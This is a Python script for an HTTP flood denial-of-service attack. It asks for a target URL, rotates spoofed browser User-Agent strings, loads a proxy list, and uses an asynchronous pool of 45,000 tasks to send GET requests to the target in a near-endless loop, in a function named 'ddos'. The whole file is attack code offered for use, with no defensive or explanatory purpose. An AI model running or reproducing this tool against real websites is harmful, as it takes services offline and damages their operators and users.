import os
import tasksio
from tasksio import TaskPool
import asyncio
import aiohttp 
os.system("clear")
#url= input("Target URL : ")
#th = int(input("Number Of Threads : "))
url = input("Target URL :")
th = 700
proxies=["37.110.112.84:8081"]
def ok():
  for line in open("proxies.txt"):
    proxies.append(line.replace("\n", ""))
  #print(proxies)
ua = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3",
]
if th == None:
    th=64
import random
import requests
import httpx

from aiohttp_proxy import ProxyConnector, ProxyType
from itertools import cycle


c=0
async def ddos(url):
  #print(url)
  headers = {'User-Agent': random.choice(ua)} 
  #prox = random.choice(proxies)
  #proxy = next(iter(proxies) )
  #proxy=random.choice(proxies)
  #connector = ProxyConnector(proxy_type=ProxyType.HTTP,host=proxy.split(":")[0],port=int(proxy.split(":")[1]),rdns=True) 
    
  
  #print(proxy)
  async with aiohttp.ClientSession() as client:
    #print(proxy)
    r = await client.get(url, headers=headers) 
    #print(proxy)
    msg = await r.text()
    print(r.status)
      
    
    #r=httpx.get(f"https://stargate.cam")
    #print(r.text())
    #requests.get(url)
  
    
  
  
  #c=c+1
  #print(f"Request {c} ")
async def stress(url, th):
  print(" Initializing.....")
  async with TaskPool(45_000) as pool:
    for i in range(9999999999999):
      await pool.put(ddos(url))
      #await pool.put(ddos(url))
ok()
import time
#time.sleep(5)
#asyncio.run(ddos(url))
asyncio.run(stress(url, th)) 





















